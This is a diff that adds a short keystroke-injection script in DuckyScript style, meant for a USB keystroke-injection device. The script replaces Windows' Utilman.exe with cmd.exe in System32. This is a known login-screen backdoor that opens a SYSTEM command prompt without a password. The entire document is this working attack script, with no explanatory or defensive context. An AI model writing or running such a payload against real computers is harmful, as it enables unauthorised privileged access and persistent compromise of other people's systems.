@@ -1,0 +1,12 @@
+DELAY 1000
+STRING cd Windows
+Enter
+DELAY 2000
+STRING cd System32
+ENTER
+DELAY 1000
+STRING move Utilman.exe Utilman.exe.bak
+ENTER
+DELAY 2000
+STRING copy cmd.exe Utilman.exe
+ENTER
